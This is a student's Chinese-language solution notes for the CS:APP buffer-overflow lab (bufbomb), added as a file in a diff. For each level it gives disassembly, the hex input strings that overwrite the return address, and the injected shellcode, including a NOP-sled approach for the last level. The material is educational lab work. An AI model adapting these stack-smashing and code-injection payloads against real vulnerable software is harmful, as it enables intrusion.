@@ -1,0 +1,162 @@
+buflab：
+
+读懂这个实验要干什么，都花时间。./hex2raw 是个64位程序，其他两个是32位，所以要注意。
+
+Userid: win
+Cookie:0x61f76021
+
+unix> cat exploit.txt | ./hex2raw | ./bufbomb -u <userid>
+Gcc -m 32 生成IA32的机器语言。
+
+
+1 		/* Buffer size for getbuf */ 
+2 		#define NORMAL_BUFFER_SIZE 32 
+3 
+4 		int getbuf() 
+5		 { 
+6		 char buf[NORMAL_BUFFER_SIZE];
+7 		Gets(buf); 
+8 		return 1;
+9 		 }
+
+
+
+
+getbuf:
+ 80491f4:	55 	pushl	%ebp
+ 80491f5:	89 e5 	movl	%esp, %ebp
+ 80491f7:	83 ec 38 	subl $56, %esp
+#计算字符数组的位置
+ 80491fa:	8d 45 d8 	leal -40(%ebp), %eax
+#将数组存放在栈顶，这样的话这个栈就40个字节大小。
+ 80491fd:	89 04 24 	movl %eax, (%esp)
+ 8049200:	e8 f5 fa ff ff calll -1291 <Gets>
+ 8049205:	b8 01 00 00 00 movl $1, %eax
+ 804920a:	c9 	leave
+ 804920b:	c3 	retl
+
+
+smoke：
+
+getbuf（）是在test里面执行的
+当getbuf（）执行返回语句ret的时候，让它执行smoke而不是返回到test。我们并不是调用smoke这些函数，而是执行她。
+
+Your task is to get BUFBOMB to execute the code for smoke when getbuf executes its return statement, rather than returning to test.
+
+所以这个应该是要覆盖掉getbuf（）的栈，并且修改test（）栈帧的中的返回地址，使得返回地址的值是smoke（）函数的地址。这样当ret指令调用的时候就会调用到我们覆盖的返回地址上这样就到了smoke上。
+所以要用40个字节的无效地址这40个字节是申请的，然后加上4个push %ebp的字节，在加上4个字节的smoke（）地址覆盖返回地址。总共48个字节，就可以了。
+11 11 11 11 11 11 11 11
+ 11 11 11 11 11 11 11 11
+ 11 11 11 11 11 11 11 11
+ 11 11 11 11 11 11 11 11
+ 11 11 11 11 11 11 11 11
+ 11 11 11 11 18 8c 04 08
+需要注意的是这里的地址的表示，小端法。
+
+Sparkler:
+这一关跟上一关差不多，不过会用我们的cookie作为参数。主要是我们要在哪里放上我们的cookie。
+让我们先来看看fizz函数。
+
+fizz:
+ 8048c42:	55 	pushl	%ebp
+ 8048c43:	89 e5 	movl	%esp, %ebp
+ 8048c45:	83 ec 18 	subl $24, %esp
+这个应该就是我们的参数，参数位于ebp上面的8个字节处，所以继续覆盖。
+ 8048c48:	8b 45 08 	movl 8(%ebp), %eax
+
+ 8048c4b:	3b 05 08 d1 04 08 cmpl 134533384, %eax
+ 8048c51:	75 26 	jne	38 <fizz+37>
+ 8048c53:	89 44 24 08 	movl %eax, 8(%esp)
+ 8048c57:	c7 44 24 04 ee a4 04 08 movl $134522094, 4(%esp)
+ 8048c5f:	c7 04 24 01 00 00 00 movl $1, (%esp)
+ 8048c66:	e8 55 fd ff ff calll -683 <.plt+1B0>
+ 8048c6b:	c7 04 24 01 00 00 00 movl $1, (%esp)
+ 8048c72:	e8 04 07 00 00 calll 1796 <validate>
+ 8048c77:	eb 18 	jmp	24 <fizz+4F>
+ 8048c79:	89 44 24 08 	movl %eax, 8(%esp)
+ 8048c7d:	c7 44 24 04 40 a3 04 08 movl $134521664, 4(%esp)
+ 8048c85:	c7 04 24 01 00 00 00 movl $1, (%esp)
+ 8048c8c:	e8 2f fd ff ff calll -721 <.plt+1B0>
+ 8048c91:	c7 04 24 00 00 00 00 movl $0, (%esp)
+ 8048c98:	e8 63 fc ff ff calll -925 <.plt+F0>
+这个实验主要是让你知道，你怎么想fizz函数传递参数。上一题你输入48个字节，后面四个字节覆盖了return addrees，那么你即将执行的函数而言，它的8（%ebp)就是返回函数在上面的一块地方。所以你直接把你的cookie写在48字节后面的四个字节上就可以了，然后修改返回地址到fizz的地址。如下：
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 42 8c 04 08
+21 60 f7 61
+
+
+
+level2 firecraker：
+bang:
+ 8048c9d:	55 	pushl	%ebp
+ 8048c9e:	89 e5 	movl	%esp, %ebp
+ 8048ca0:	83 ec 18 	subl $24, %esp
+这个是global变量
+ 8048ca3:	a1 00 d1 04 08 movl 134533376, %eax
+这个是cookie，global要和cookie相等,等我们运行的时候cookie这个位置就有值了
+ 8048ca8:	3b 05 08 d1 04 08 cmpl 134533384, %eax
+ 8048cae:	75 26 	jne	38 <bang+39>
+ 8048cb0:	89 44 24 08 	movl %eax, 8(%esp)
+ 8048cb4:	c7 44 24 04 60 a3 04 08 movl $134521696, 4(%esp)
+ 8048cbc:	c7 04 24 01 00 00 00 movl $1, (%esp)
+ 8048cc3:	e8 f8 fc ff ff calll -776 <.plt+1B0>
+ 8048cc8:	c7 04 24 02 00 00 00 movl $2, (%esp)
+ 8048ccf:	e8 a7 06 00 00 calll 1703 <validate>
+ 8048cd4:	eb 18 	jmp	24 <bang+51>
+ 8048cd6:	89 44 24 08 	movl %eax, 8(%esp)
+ 8048cda:	c7 44 24 04 0c a5 04 08 movl $134522124, 4(%esp)
+ 8048ce2:	c7 04 24 01 00 00 00 movl $1, (%esp)
+ 8048ce9:	e8 d2 fc ff ff calll -814 <.plt+1B0>
+ 8048cee:	c7 04 24 00 00 00 00 movl $0, (%esp)
+ 8048cf5:	e8 06 fc ff ff calll -1018 <.plt+F0>
+我们要做的是，将804d100这个地方的global变量设置成cookie。这个bang函数虽然有参数，但是竟然没有使用所以汇编里也没有传递参数的部分。
+
+提示上说：可以写string然后编码成机器语言，然后在用指令地址重写返回指针。当getbuf执行ret的时候会执行这些指令。所以可以做任何事。
+那我们把global设置成cookie，然后call firecraker。
+
+将汇编保存成.s文件，然后 as 生成重定位文件，最后再用反汇编得到16进制指令编码。
+
+我们可以知道cookie在804d108，global在804d100，因为cookie在run的时候会生成，所以804d108处是有值的，所以我们把cookie mov到804d100上，然后把bang的地址push到stack，再ret。这些都是在实验上说明了的。所以我觉得只要看了实验文档基本上就会做。
+8b 04 25 08 d1 04 08
+89 04 25 00 d1 04 08
+68 9d 8c 04 08 c3
+这是这些指令反汇编之后的二进制。然后使用gdb在getbuf处设置断点。知道你输入的string在栈上的地址，即%ebp-40这个地址，这个就是上面👆指令的地址，得到F8 34 68 55（小端法表示），用这个地址覆盖getbuf的返回地址，那么就会执行我们的指令，我们的指令里面有bang的地址，就会执行bang并且ret了。
+
+
+level3: dynamite
+
+Push其实和call有相同的地方，都修改了esp指针所指的位置，所以ret都可以返回去。
+
+以前我们的attack都是破坏了栈并重写了值。这个实验会改变register／memory的状态但是返回original 的调用。这种类型的攻击很有技巧，因为你必须在栈上添加机器代码，并设置返回指针到你的代码开始的地方，而且不要做任何破坏栈状态。
+
+也就是说我们在覆盖%ebp之后还要恢复它，使用ret指令返回到test
+%ebp的值是0x55683520这是个指针，是一个栈地址，栈这个位置的值是0x55683550，所以我们的指令会覆盖的是这个值。
+return add是0x55683524，这地址上的值是0x8048dbe，就是getbuf的下一个地址。
+这是我写的指令，需要注意的是立即数和地址：
+
+movl 0x804d108,%eax／／修改return
+movl $0x55683550, %ebp／／恢复ebp
+push $0x8048dbe／／上面写过push和call都修改esp指向的值。而ret执行的是esp的值。所以push和call有相同的作用。
+ret
+
+As 汇编，然后反汇编。
+
+level4：Nitroglycerin
+
+感觉不是在做计算机题目而是在做阅读理解==。
+
+
+Buffer有512个字节，但是getbufn申请的空间却不一样大。
+所以ebp的值每次都会变，所以你怎么恢复它。所以重点是确定ebp的所值位置上的值，返回地址可以根据ebp计算。但是相对位置是不变的。
+在程序中地址不是不变的。所以什么地址都会变，像ebp或者buf的开始地址。关键是我们可以使用nop指令，相当于插入气泡。
+关键是还要知道保存的ebp的值保存的是什么，是调用者的帧指针，所以getbufn的ebp，保存的个testn的ebp是一样的。当你ret执行完之后esp就是调用者的esp了。我只要把指令放在前面然后nop，然后满足条件我就可以执行前面的指令。
+
+
+movl 0x804d108,%eax
+leal 40(%esp), %ebp
+push $0x8048e3a
+ret
